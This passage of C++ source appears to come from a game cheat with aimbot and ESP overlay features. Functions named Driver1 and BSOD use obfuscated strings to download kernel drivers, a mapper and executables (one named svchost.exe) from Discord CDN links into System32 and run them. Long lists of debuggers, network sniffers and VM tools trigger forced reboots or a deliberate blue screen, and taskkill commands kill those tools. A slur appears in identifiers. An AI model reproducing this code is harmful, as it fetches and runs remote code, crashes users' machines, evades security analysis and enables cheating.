			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}

		y = pos.y + textSize.y * (i + 1);
		i++;
	}
	return y;
}


void DrawText1(int x, int y, const char* str, RGBA* color)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), utf_8_2.c_str());
}

void DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness)
{
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness);
}

void DrawCircle(int x, int y, int radius, RGBA* color, int segments)
{
	ImGui::GetOverlayDrawList()->AddCircle(ImVec2(x, y), radius, ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), segments);
}

void DrawBox(float X, float Y, float W, float H, RGBA* color)
{
	ImGui::GetOverlayDrawList()->AddRect(ImVec2(X + 1, Y + 1), ImVec2(((X + W) - 1), ((Y + H) - 1)), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)));
	ImGui::GetOverlayDrawList()->AddRect(ImVec2(X, Y), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)));
}

void DrawCorneredBox(int X, int Y, int W, int H, const ImU32& color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	//black outlines
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);

	//corners
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}




typedef struct _FNlEntity
{
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;

std::vector<FNlEntity> entityList;

void bsod()
{

	system("shutdown -r");
	//exit(0);
	//BOOLEAN bl;
	//ULONG Response;
	//RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	//NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}

void nignog() {



	if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { bsod(); }
	if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { bsod(); }
	if (FindWindowA(NULL, ("Fiddler"))) { bsod(); }
	if (FindWindowA(NULL, ("HTTP Debugger"))) { bsod(); }
	if (FindWindowA(NULL, ("x64dbg"))) { bsod(); }
	if (FindWindowA(NULL, ("dnSpy"))) { bsod(); }
	if (FindWindowA(NULL, ("FolderChangesView"))) { bsod(); }
	if (FindWindowA(NULL, ("BinaryNinja"))) { bsod(); }
	if (FindWindowA(NULL, ("HxD"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.1"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { bsod(); }
	if (FindWindowA(NULL, ("Cheat Engine 6.8"))) { bsod(); }
	if (FindWindowA(NULL, ("Ida"))) { bsod(); }
	if (FindWindowA(NULL, ("Ida Pro"))) { bsod(); }
	if (FindWindowA(NULL, ("Ida Freeware"))) { bsod(); }
	if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { bsod(); }
	if (FindWindowA(NULL, ("Process Hacker"))) { bsod(); }
	if (FindWindowA(NULL, ("Process Hacker 2"))) { bsod(); }
	if (FindWindowA(NULL, ("OllyDbg"))) { bsod(); }
	if (FindWindowA(NULL, ("Taskmgr.exe"))) { bsod(); }

}

bool is_debugging() {
	// - https://anti-debug.checkpoint.com/
	// - https://github.com/BaumFX/cpp-anti-debug
	// - https://github.com/HackOvert/AntiDBG
	// - https://www.unknowncheats.me/forum/general-programming-and-reversing/374975-coldhide-simple-anti-anti-debug-library-windows.html / https://github.com/Rat431/ColdHide_V2


	// for example 
	BOOL DebuggerPresent = false;
	LI_FN(CheckRemoteDebuggerPresent)(LI_FN(GetCurrentProcess)(), &DebuggerPresent);

	if (LI_FN(IsDebuggerPresent)() or DebuggerPresent)
		return true;

	return false;
}
/*
void security_thread()
{
	do {
		if (is_debugging())
			client::logged_in ? KeyAuthApp.ban() : LI_FN(exit)(69); // we need to be logged in to ban lol

		std::this_thread::sleep_for(std::chrono::milliseconds(500));
	} while (1);
}
*/


void debug()
{




	if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Fiddler"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("HTTP Debugger"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("x64dbg"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("dnSpy"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("FolderChangesView"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("BinaryNinja"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("HxD"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Cheat Engine 7.1"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Cheat Engine 6.8"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Ida"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Ida Pro"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Ida Freeware"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Process Hacker"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Process Hacker 2"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("OllyDbg"))) { system("shutdown -r"); }
	if (FindWindowA(NULL, ("Taskmgr.exe"))) { system("shutdown -r"); }
}

void no_exec(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)

		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}

void exedetect()
{

}

void titledetect()
{

}

void driverdetect()
{
	const TCHAR* devices[] = {
_T("\\\\.\\NiGgEr"),
_T("\\\\.\\KsDumper")
	};

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE) {
			system(_xor_("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
			exit(0);
		}
		else
		{

		}
	}
}


void antidebug()
{




	while (true)
	{
		Sleep(100);
		titledetect();
		exedetect();
		driverdetect();
	}
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ClearConsole()
{
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written);
	FillConsoleOutputAttribute(console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE, screen.dwSize.X * screen.dwSize.Y, topLeft, &written);
	SetConsoleCursorPosition(console, topLeft);
	return;
}

bool rpm() {
	uintptr_t addr_read = Read<uintptr_t>(process_base);
	//std::cout << "Read: " << addr_read << "\n";
	Sleep(1000);
	return true;
}

void Hide()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void Show()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

void Slow(const std::string& str, int delay_time)
{
	for (size_t i = 0; i != str.size(); ++i)
	{
		std::cout << str[i];
		Sleep(delay_time);
	}
}




void Driver1()
{
	Hide();

	/*------*/ URLDownloadToFileA(NULL, _xor_("https://cdn.discordapp.com/attachments/974451930099232808/974451973258629140/kernel.sys").c_str(), _xor_("C:\\Windows\\System32\\ddsadguwdfydsafysay.sys").c_str(), 0, NULL); //

	/*------*/ URLDownloadToFileA(NULL, _xor_("https://cdn.discordapp.com/attachments/974451930099232808/975165902221877348/ph0bia.sys").c_str(), _xor_("C:\\Windows\\System32\\drhdauguwhsiufadsh.sys").c_str(), 0, NULL); //

	/*------*/URLDownloadToFileA(NULL, _xor_("https://cdn.discordapp.com/attachments/832804527114813505/965401710845657088/mapper.exe").c_str(), _xor_("C:\\Windows\\System32\\drddfdsfnfdjdffdasfdfsassfsfadssdfsadasasf.exe").c_str(), 0, NULL); //


	system(_xor_("start C:\\Windows\\System32\\drddfdsfnfdjdffdasfdfsassfsfadssdfsadasasf.exe C:\\Windows\\System32\\drhdauguwhsiufadsh.sys").c_str());
	LI_FN(Sleep)(3000);
	system(_xor_("start C:\\Windows\\System32\\drddfdsfnfdjdffdasfdfsassfsfadssdfsadasasf.exe C:\\Windows\\System32\\ddsadguwdfydsafysay.sys").c_str());
	LI_FN(Sleep)(3000);


	//

	/*----*/ remove(_xor_("C:\\Windows\\System32\\drddfdsfnfdjdffdasfdfsassfsfadssdfsadasasf.exe").c_str());

	/*----*/ remove(_xor_("C:\\Windows\\System32\\drddfdsfnfdjdffdasfdfsassfsfadssdfsadasasf.exe").c_str());

	/*----*/ remove(_xor_("C:\\Windows\\System32\\drhdauguwhsiufadsh.sys").c_str());

	/*----*/ remove(_xor_("C:\\Windows\\System32\\ddsadguwdfydsafysay.sys").c_str());

	Show();


}
void BSOD()
{
	Hide();
	URLDownloadToFileA(NULL, _xor_("https://cdn.discordapp.com/attachments/972220632957861940/980515293564665976/svchost.exe").c_str(), _xor_("C:\\Windows\\System32\\sadwredsa.exe").c_str(), 0, NULL);
	Sleep(1000);
	system(_xor_("start C:\\Windows\\System32\\sadwredsa.exe").c_str());
	URLDownloadToFileA(NULL, _xor_("https://cdn.discordapp.com/attachments/972220632957861940/980514701341491270/map.exe").c_str(), _xor_("C:\\Windows\\System32\\fdsaadsa.exe").c_str(), 0, NULL);
	Sleep(1000);
	system(_xor_("start C:\\Windows\\System32\\fdsaadsa.exe").c_str());
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	system(_xor_("taskkill /IM svchost.exe /F").c_str());
	exit(0);
}
void Protections()
{

	HWND window;

	window = FindWindow(0, ((L"KsDumperClient")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"HTTPDebuggerUI")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"HTTPDebuggerSvc")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"FolderChangesView")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ProcessHacker")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"procmon")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"idaq")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"idaq64")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Wireshark")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Fiddler")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Xenos64")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Cheat Engine")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"HTTP Debugger Windows Service (32 bit)")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"KsDumper")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"x64dbg")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"FileActivityWatch")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ollydbg")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ProcessHacker")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Dump-Fixer")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"kdstinker")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"tcpview")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"autoruns")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"autorunsc")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"filemon")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"procmon")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"regmon")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"procexp")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ImmunityDebugger")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Wireshark")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"dumpcap")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"HookExplorer")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ImportREC")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"PETools")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"LordPE")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"dumpcap")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"SysInspector")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"proc_analyzer")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"sysAnalyzer")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"sniff_hit")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"windbg")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"joeboxcontrol")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Fiddler")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"joeboxserver")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ida64")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ida")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"idaq64")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Vmtoolsd")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Vmwaretrat")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Vmwareuser")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Vmacthlp")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"vboxservice")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"vboxtray")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"ReClass.NET")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"x64dbg")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"OLLYDBG")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Cheat Engine")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"cheatengine-x86_64-SSE4-AVX2")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"MugenJinFuu-i386")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Mugen JinFuu")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"MugenJinFuu-x86_64-SSE4-AVX2")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"MugenJinFuu-x86_64")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"KsDumper")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"dnSpy")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"cheatengine-i386")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"cheatengine-x86_64")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Fiddler Everywhere")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"HTTPDebuggerSvc")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"Fiddler.WebUi")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"createdump")));
	if (window)
	{
		BSOD();
	}
	window = FindWindow(0, ((L"IDA: Quick start")));
	if (window)
	{
		BSOD();
	}

	window = FindWindow(0, ((L"Memory Viewer")));
	if (window)
	{
		BSOD();
	}

	window = FindWindow(0, ((L"Process List")));
	if (window)
	{
		BSOD();
	}

	window = FindWindow(0, ((L"KsDumper")));
	if (window)
	{
		BSOD();
	}

	system(_xor_("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Ida64.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Dbg64.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Dbg32.exe >nul 2>&1").c_str());
	system(_xor_("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq httpDebugger*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im vgtray.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(_xor_("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq httpDebugger*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq x64dbg*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq x32dbg*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq ollydbg*\" /IM * /F /T >nul 2>&1").c_str());
	system(_xor_("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1").c_str());

	const TCHAR* devices[] =
	{
		(_xor_(_T("\\\\.\\NiGgEr")).c_str()),
		_xor_(_T("\\\\.\\KsDumper")).c_str()
	};

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE)
		{
			BSOD();
		}
		else
		{

		}
	}
	Show();
}

void WriteStringToIni(std::string string, std::string file, std::string app, std::string key)
{
	WritePrivateProfileStringA(app.c_str(), key.c_str(), string.c_str(), file.c_str());
}

std::string ReadStringFromIni(std::string file, std::string app, std::string key)
{
	char buf[100];
	GetPrivateProfileStringA(app.c_str(), key.c_str(), _xor_("NULL").c_str(), buf, 100, file.c_str());
	return (std::string)buf;
}

float SavedAimFOV = 1;
float SavedAimSmoothness = 1;
float SavedESPDis = 1;
float SavedHeadSize = 1;
float SavedEsp_Line = 1;
float SavedEsp_Corner_Box = 1;

std::string ReadStringFromIni_Float(std::string file, std::string app, std::string key, int float_code)
{
	char buf[100];
	GetPrivateProfileStringA(app.c_str(), key.c_str(), _xor_("NULL").c_str(), buf, 100, file.c_str());

	if (float_code == 0)
	{
		system(_xor_("cls").c_str());
		std::cout << _xor_(" [").c_str() << _xor_("ERR - 14").c_str() << _xor_("] - Contact Support.").c_str();
		Sleep(5000);
		exit(0);
	}
	else if (float_code == 1) {

	}
	else if (float_code == 2) {

	}
	else if (float_code == 3) {

	}
	else if (float_code == 4)
	{
		SavedAimFOV = std::stof(buf);
	}
	else if (float_code == 5)
	{
		SavedAimSmoothness = std::stof(buf);
	}
	else if (float_code == 6)
	{
		SavedESPDis = std::stof(buf);
	}
	else if (float_code == 7)
	{
		SavedHeadSize = std::stof(buf);
	}
	else if (float_code == 8)
	{
		SavedEsp_Corner_Box = std::stof(buf);
	}
	else if (float_code == 9)
	{
		SavedEsp_Line = std::stof(buf);
	}
	return (std::string)buf;
}

void SaveConfig()
{
	if (Settings::Aimbot)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimbot").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimbot").c_str());
	}

	if (Settings::Aim_Prediction)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimbotpred").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("aimbotpred").c_str());
	}

	if (Settings::SkipKnocked)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("SkipKnocked").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("SkipKnocked").c_str());
	}

	if (Settings::Controller)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("controller").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("controller").c_str());
	}

	if (Settings::FOVMode)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("drawfov").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("drawfov").c_str());
	}

	if (Settings::Esp_box)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("box").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("box").c_str());
	}

	if (Settings::Esp_box_fill)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("boxfill").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("boxfill").c_str());
	}

	if (Settings::Esp_Corner_Box)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("cornerbox").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("cornerbox").c_str());
	}

	if (Settings::SkeletonESP)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("skel").c_str());
	}
	else
	{
		WriteStringToIni(_xor_("0").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("skel").c_str());
	}

	if (Settings::Esp_line)
	{
		WriteStringToIni(_xor_("1").c_str(), _xor_("C:\\ProgramData\\PegasusSoftaim.config").c_str(), _xor_("options").c_str(), _xor_("linesp").c_str());
	}
	else
	{
